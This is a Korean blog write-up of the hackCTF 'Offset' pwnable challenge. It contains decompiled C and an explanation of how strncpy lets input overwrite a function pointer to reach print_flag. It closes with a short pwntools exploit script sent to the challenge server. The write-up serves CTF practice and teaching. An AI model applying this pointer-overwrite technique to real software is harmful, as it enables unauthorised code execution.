---
layout: post
title:  "[hackCTF]Offset"
date:   2020-02-18
categories: [hackCTF]
tags: [hackCTF]
permalink: '/hackCTF'
---

hackCTF pwnable 8번째 문제

![favicon](https://github.com/kkarung/kkarung.github.io/blob/master/assets/image/favicons.png?raw=true)

## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1h] [ebp-27h]
  int * v5; // [esp+20h] [ebp-8h]

  v5 = &argc;
  setvbuf(stdout, (char * )&dword_0 + 2, 0, 0);
  puts("Which function would you like to call?");
  gets(&s);
  select_func(&s);
  return 0;
}
```

## ida - select_func
```c
int __cdecl select_func(char *src)
{
  char dest; // [esp+Eh] [ebp-2Ah]
  int (*v3)(void); // [esp+2Ch] [ebp-Ch]

  v3 = (int (*)(void))two;
  strncpy(&dest, src, 0x1Fu); // src의 값을 dest에 저장한다
  if ( !strcmp(&dest, "one") ) // dest의 값이 "one"이면
    v3 = (int (*)(void))one; // v3에 one함수의 주소를 저장한다
  return v3();
}
```

## ida - one
```c
int one()
{
  return puts("This is function one!");
}
```

## ida - print_flag
```c
int print_flag()
{
  char i; // al
  FILE * fp; // [esp+Ch] [ebp-Ch]

  puts("This function is still under development.");
  fp = fopen("flag.txt", "r");
  for ( i = _IO_getc(fp); i != -1; i = _IO_getc(fp) )
    putchar(i); // flag 값을 출력한다
  return putchar(10);
}
```

## ida - two
```c
int two()
{
  return puts("This is function two!");
}
```
<br>

정리해보자.<br><br>

***

|  v3  | esp+0x2C |
|:----:|:--------:|
|  ... |          |
| dest |  esp+0xE |

***
<br>
select_func에서 src의 값을 dest에 저장할 때 print_flag함수 주소로 v3까지 덮으면 return v3();에서 print_flag를 실행할 수 있을 것이다.<br><br>
목표 : select_func에서 v3를 print_flag 주소로 덮기<br>
취약점 : strncpy(&dest, src, 0x1Fu)<br><br><br>
+) print_flag Offset

![0801](https://github.com/kkarung/kkarung.github.io/blob/master/assets/image/hackCTF/0801.JPG?raw=true)

offset을 알기 때문에 off-by-one 기법이 적용되었음ㅇㅇ

## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3007)

payload = "A"*(0x2c-0xe)+p32(0x000006D8)

p.sendline(payload)

p.interactive()
```

## 결과
![0802](https://github.com/kkarung/kkarung.github.io/blob/master/assets/image/hackCTF/0802.JPG?raw=true)
